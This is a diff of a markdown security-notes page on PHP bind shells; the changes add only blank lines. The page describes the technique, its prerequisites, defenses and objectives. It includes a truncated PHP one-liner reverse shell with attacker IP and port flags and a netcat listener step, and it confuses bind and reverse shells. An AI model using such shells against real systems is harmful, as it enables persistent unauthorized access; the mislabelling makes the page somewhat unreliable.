@@ -30,6 +30,8 @@ A PHP Bind Shell is a type of shell that is used to establish a persistent backd
 
 A PHP Bind Shell is a type of shell that is used to establish a persistent backdoor on a target system. The shell allows an attacker to execute commands on the target system and access its resources. PHP Bind Shells are typically used as a post-exploitation technique to maintain access to a compromised system. To establish a PHP Bind Shell, an attacker would typically upload a PHP script to a vulnerable web application and then execute it. The script would then listen on a specified port for incoming connections, and when a connection is received, it would spawn a shell that the attacker can use to execute commands on the target system. From a technical perspective, a PHP Bind Shell is a PHP script that listens on a specified port and spawns a shell when a connection is received. Business value: Attackers can use PHP Bind Shells to maintain access to a compromised system and steal sensitive data, install malware, or launch further attacks.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable web application
@@ -37,6 +39,8 @@ A PHP Bind Shell is a type of shell that is used to establish a persistent backd
 1. Ability to upload a PHP script
 
 1. Network access to the target system
+
+ 
 
 ## Defense
 
@@ -46,6 +50,8 @@ A PHP Bind Shell is a type of shell that is used to establish a persistent backd
 
 1. Use strong authentication mechanisms to prevent unauthorized access to vulnerable web applications
 
+ 
+
 ## Objectives
 
 1. Establish a persistent backdoor on the target system
@@ -54,11 +60,19 @@ A PHP Bind Shell is a type of shell that is used to establish a persistent backd
 
 1. Maintain access to the compromised system
 
+ 
+
 # Instructions
 
 1. This command creates a PHP reverse shell which allows the attacker to connect to the victim's machine and execute commands remotely. The attacker needs to run a netcat listener to receive the connection.
 
+ 
+
+
+
 **Code**: [[php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_T]]
+
+
 
 > -s: The IP address of the attacker's machine.
 -p: The port number on which the attacker's machine is listening.
@@ -89,3 +103,5 @@ This will establish a connection between the attacker's and victim's machine and
 
 - [[Bind Shell]]
 - [[PHP]]
+
+
